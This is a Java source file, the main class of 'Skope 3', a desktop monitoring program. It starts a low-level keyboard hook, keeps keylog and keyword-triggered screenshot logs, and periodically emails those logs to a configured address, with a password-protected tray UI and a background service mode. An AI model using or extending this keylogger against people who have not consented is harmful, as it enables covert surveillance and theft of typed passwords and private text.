package com.gundersoft.skope3;

import java.awt.TrayIcon;
import java.io.IOException;
import javax.swing.JOptionPane;
import org.jnativehook.NativeHookException;

/**
 * Skope 3 Execution entry point and instance Class. Instantiates itself
 * upon execution and contains all widely objects needed by Skope. 
 * @author Christian Gunderman
 */
public class Main {
    /** Configuration File Parser */
    private Configuration settings;
    /** SkopeShot Service */
    private Service service;
    /** System Tray Icon */
    private TrayIcon trayIcon;
    /** UI Context */
    private UIBuilder builder;
    /** Security handler context */
    private Security security;
    /** Emailer Service Context */
    private EmailService emailService;
    /** Error log Object */
    private Log log;
	
    /**
     * Instantiates this instance of Skope 3 and starts up the application.
     * @param args Command line arguments.
     */
    private Main(String[] args) {
		
	// load settings
	this.loadSettings();
				
	// open log file
	if(!this.createLog())
	    System.out.println("Fatal Error: Could not open execution log.");
		
	// startup UI Builder
	this.createUIBuilder();
				
	// create service and import dictionary file
	this.createService();
		
	// create tray icon
	if((this.trayIcon = TrayIconBuilder.build(this)) == null) {
	    log.e("Failed to create TrayIcon. Tray icon is probably not supported" 
		  + "on this system.");
	    this.emergencyTerminate();
	}
		
	// start email service
	this.createEmailService();
		
	// auto activate
	if(this.settings.getBooleanValue("Skope3.Service.Activated", false)) {
	    this.startService();
	} else
	    this.stopService();
		
	// load security
	this.security = new Security(this.settings.getStringValue("Skope3.Security.Password", null));
				
	// handle command line args
	this.processArguments(args); 
		
	// end of start up procedure divider
	this.log.divider();
		
	// debug mode? launch UI to save developers time
	if(this.settings.getBooleanValue("Skope3.Debug", false)) {
	    launchUI();
	    this.log.w("Debug mode enabled.");
	}
    }
	
    /**
     * Initializes the Email Service
     */
    private void createEmailService() {
		
	// determine if send pictures is enabled
	boolean enabled = this.settings.getBooleanValue("Skope3.Email.SendPictures", true);
		
	// get email interval
	long emailInterval = (long)this.settings.getNumberValue(
								"Skope3.Email.EmailInterval", 43200000);
		
	// create email service
	log.i("Creating Email Dispatch Service. Email will be dipatched every "
	      , Long.toString(emailInterval), " m/s.");
	log.i("Email Dispatch Service ", enabled ? "Enabled":"Disabled");
	long lastDispatch = (long)this.settings.getNumberValue("Skope3.Email.LastDispatch", 0);
	this.emailService = new EmailService(this.settings.getStringValue("Skope3.Email.Username", null),
					     this.settings.getStringValue("Skope3.Email.Password", null), 
					     this.settings.getStringValue("Skope3.Email.Destination", null), 
					     this.settings.getStringValue("Skope3.Service.TextLogFile", "textlog.dat"),
					     this.settings.getStringValue("Skope3.Service.KeyLogFile", "textlog.dat"), lastDispatch,
					     emailInterval, enabled, this.log);
		
	// enable email service
	if(this.settings.getBooleanValue("Skope3.Email.Enabled", false))
	    this.emailService.setEnabled(true);
		
    }
	
    /**
     * Creates the SkopeShotService
     */
    private void createService() {
		
	// create service and import dictionary
	this.log.i("Creating SkopeShot Service Context");
	try {
	    this.service = new Service(
				       (int)this.settings.getNumberValue("Skope3.Service.DefaultDelay", 4000),
				       (int)this.settings.getNumberValue("Skope3.Service.DefaultNumber", 10),
				       this.settings.getStringValue("Skope3.Service.TextLogFile", "textlog.dat"),
				       this.settings.getStringValue("Skope3.Service.KeyLogFile", "keylog.dat"),
				       (int)this.settings.getNumberValue("Skope3.Service.TimeStampInterval", 5000),
				       (int)this.settings.getNumberValue("Skope3.Service.BufferFlushInterval", 120000),
				       log);
	    this.service.importKeywords(this.settings.getStringValue(
								     "Skope3.Service.DictionaryFile", "keywords.dic"));
	} catch(NativeHookException e) {
	    JOptionPane.showMessageDialog(null, "Unable to create low level keyboard event hook.", 
					  "Skope 3", JOptionPane.ERROR_MESSAGE);
	    this.log.e("Unable to create low level keyboard hook. Please try again.");
	    this.emergencyTerminate();
	}
    }
	
    /**
     * Initialize the User interface builder context.
     */
    private void createUIBuilder() {
		
	// get the theme directory
	String themeDir = settings.getStringValue("Skope3.UI.ThemeDirectory", "pixmaps/default");
		
	// build UI builder
	this.log.i("Creating UI Context and loading theme files from \"", themeDir, "\"");
	try {
	    this.builder = new UIBuilder(themeDir);
	    this.builder.setLabelShadowOffset(3);
	} catch (IOException e) {
	    JOptionPane.showMessageDialog(null, 
					  "Error! Unable to load required theme files. \r\n\r\n" + 
					  e.getMessage() , "Skope 3 Error", JOptionPane.ERROR_MESSAGE);
	    this.log.e("Unable to load required theme files: ", e.getMessage());
			
	    // exit and save log
	    this.emergencyTerminate();
	}
    }
	
    /**
     * Initialize the logging system
     * @return
     */
    private boolean createLog() {
		
	// instantiate log handler
	try {
	    this.log = new Log("Skope-3.log", 
			       "[\r\n  Skope 3 Event Log\r\n  (C)2013 C. Gunderman\r\n]\r\n",
			       (int)this.settings.getNumberValue("Skope3.LoggingMode", 0));
	} catch (IOException e1) {
	    return false;
	}
		
	// write new log entry
	this.log.section("New Execution");
	this.log.i("Starting up...");
		
	return true;
    }
	
    /**
     * Gets the email service.
     * @return The emailer service.
     */
    public EmailService getEmailService() {
	return this.emailService;
    }
	
    /**
     * Gets the configuration file parser.
     * @return The configuration file parser.
     */
    public Configuration getSettings() {
	return settings;
    }
	
    /**
     * Gets the SkopeShotService
     * @return The SkopeShot Service instance.
     */
    public Service getService() {
	return this.service;
    }
	
    /**
     * Gets the UI builder context.
     * @return The UIcontext.
     */
    public UIBuilder getBuilder() {
	return this.builder;
    }
	
    /**
     * Gets the Security context.
     * @return The security context.
     */
    public Security getSecurity() {
	return this.security;
    }
	
    /**
     * Creates the Configuration file parser object.
     */
    private void loadSettings() {
	this.settings = new Configuration("Skope-3.ini", "[\n  Skope 3 Configuration Settings\n" 
					  + "  (C) 2013 Christian Gunderman\n  WARNING: This file will be"
					  + " overwritten.\n]\n");
    }
	
    /**
     * Audits security and then launches the default UI dialog box.
     * @return
     */
    public void launchUI() {
	if(this.security.auditPasswordDialog(null, this.builder))
	    SkopeDialog.display(null, this);
    }
	
    /**
     * Terminates without saving settings. Only saves the log file.
     * Called upon EVERY shutdown by standard terminate()
     */
    public void emergencyTerminate() {
	this.log.i("Saving log.");
	this.log.i("**Gasp** (last breath...gone...)");
	this.log.close();
	System.exit(0);
    }
	
    /**
     * Exits cleanly, saves settings, keywords, activation
     * state, etc.
     */
    public void terminate() {
	this.log.divider();
	this.log.i("Shutting down...");
		
	// save service keywords
	this.log.i("Exporting SkopeShot Service keywords to dictionary file.");
	this.service.exportKeywords(
				    this.settings.getStringValue("Skope3.Service.DictionaryFile", 
								 "keywords.dic"));
		
	// save activation state
	this.settings.setBooleanValue("Skope3.Service.Activated", 
				      this.getService().isEnabled());
		
	// save password hashes
	this.log.i("Saving password hashes.");
	String passwordHash = this.security.getPasswordHash();
	if(passwordHash != null) {
	    this.settings.setStringValue("Skope3.Security.Password", 
					 passwordHash);
	    this.log.i("Saving password hashes.");
	} else {
	    this.settings.deleteValue("Skope3.Security.Password");
	    this.log.w("No Password! Deleting password settings key.");
	}
		
	// save last email dispatch time
	this.settings.setNumberValue("Skope3.Email.LastDispatch", 
				     this.emailService.getLastDispatchTime());
		
	// save settings
	this.log.i("Saving Settings.");
	this.settings.save();

	// save log and quit
	emergencyTerminate();
    }
	
    /**
     * Prints command line help and copyright info
     */
    private void printHelp() {
	System.out.println(AboutDialog.versionText + "\r\n" + AboutDialog.authorText + "\r\n");
	System.out.println("The following command line arguments are supported:\r\n");
	System.out.println("  -h, --help         Displays this help message.");
	System.out.println("  -s, --service      Runs Skope Service in background.");
	System.out.println("  -p, --pre-config   Sets Skope Password if there is none.");
    }
	
    /**
     * Starts the SkopeShot Service, keylogger, and sets tray icon states.
     */
    public void startService() {
	this.service.setEnabled(true);
	this.trayIcon.setToolTip("Skope 3 - Active");
	this.trayIcon.getPopupMenu().setLabel("Skope 3 - Active");
	this.log.i("SkopeShot Service Activated");
    }
	
    /**
     * Stops the SkopeShot Service, keylogger, and sets tray icon states.
     */
    public void stopService() {
	this.service.setEnabled(false);
	trayIcon.setToolTip("Skope 3 - Inactive");
	trayIcon.getPopupMenu().setLabel("Skope 3 - Inactive");
	this.log.i("SkopeShot Service Deactivated");
    }
	
    /**
     * Responds to command line arguments
     * @param args Command line arguments
     */
    // TODO: more command args
    private void processArguments(String[] args) {
	for(int i = 0; i < args.length; i++) {
	    if(args[i].equals("-h") || args[i].equals("--help"))
		printHelp();
	    else if(args[i].equals("-s") || args[i].equals("--service"))
		startService();
	    else if(args[i].equals("-p") || args[i].equals("--pre-config")) {
		if(!this.security.isHashPresent())
		    this.security.resetPasswordDialog(null, this.builder);
		else
		    JOptionPane.showMessageDialog(null,
						  "Cannot set password. There is already a password present.", 
						  "Skope 3", JOptionPane.ERROR_MESSAGE);
	    } else {
		printHelp();
		this.log.w("Unrecognized command line arguments.");
	    }
	}
    }
	
    /**
     * Entry point. Initializes application object.
     * @param args Command line arguments.
     */
    public static void main(String[] args)  {
	//if(Tools.lockInstance("lockfile"))
	new Main(args);
	/*else
	  JOptionPane.showMessageDialog(null, 
	  "Unable to start Skope 3. Another instance is already running.", 
	  "Skope 3", JOptionPane.ERROR_MESSAGE);
	  return;*/
    }
}